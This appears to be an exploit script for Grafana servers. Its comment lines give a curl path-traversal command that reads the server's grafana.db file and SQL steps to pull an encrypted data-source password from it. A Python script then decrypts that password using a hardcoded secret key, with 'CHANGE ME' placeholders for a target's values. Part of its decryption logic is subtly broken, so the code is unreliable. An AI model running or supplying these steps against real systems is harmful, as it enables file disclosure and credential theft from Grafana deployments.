# 1. curl --path-as-is http://$IP:3000/public/plugins/alertGroups/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
# 2. sqlite3 grafana.db
# 3. .tables
# 4. select * from data_source;
# 1|1|1|prometheus|Prometheus|server|http://localhost:9090||||0|sysadmin||0|{}|2022-02-04 09:19:59|2022-02-04 09:19:59|0|{"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="}|0|HkdQ8Ganz
#python3 grafana_decrypt_secret.py


import base64
from hashlib import pbkdf2_hmac
from Crypto.Cipher import AES

saltLength = 8
aesCfb = "aes-cfb"
aesGcm = "aes-gcm"
encryptionAlgorithmDelimiter = '*'
nonceByteSize = 12

def decrypt(payload, secret):
    alg, payload, err = deriveEncryptionAlgorithm(payload)

    if err is not None:
        return None, err

    if len(payload) < saltLength:
        return None, "Unable to compute salt"

    salt = payload[:saltLength]
    key, err = encryptionKeyToBytes(secret, salt)

    if err is not None:
        return None, err

    if alg == aesCfb:
        return decryptCFB(payload, key)
    elif alg == aesGcm:
        return decryptGCM(payload, key)

    return None, None


def deriveEncryptionAlgorithm(payload):
    if len(payload) == 0:
        return "", None, "Unable to derive encryption"

    if payload[0] != encryptionAlgorithmDelimiter.encode():
        return aesCfb, payload, None

    payload = payload[:1]


def encryptionKeyToBytes(secret, salt):
    return pbkdf2_hmac("sha256", secret.encode("utf-8"), salt, 10000, 32), None


def decryptGCM(payload, key):
    nonce = payload[saltLength: saltLength+nonceByteSize]
    payload = payload[saltLength+nonceByteSize:]

    gcm = AES.new(key, AES.MODE_GCM, nonce, segment_size=128)

    return gcm.decrypt(payload).decode(), None


def decryptCFB(payload, key):
    if len(payload) < AES.block_size:
        return None, "Payload too short"

    iv = payload[saltLength: saltLength + AES.block_size]
    payload = payload[saltLength+AES.block_size:]

    cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)

    return cipher.decrypt(payload).decode(), None

if __name__ == "__main__":
    grafanaIni_secretKey = "SW2YcwTIb9zpOOhoPsMm"       # CHANGE ME
    dataSourcePassword = "anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="     # CHANGE ME

    encrypted = base64.b64decode(dataSourcePassword.encode())
    pwdBytes, _ = decrypt(encrypted, grafanaIni_secretKey)
    print("Password = ", pwdBytes)
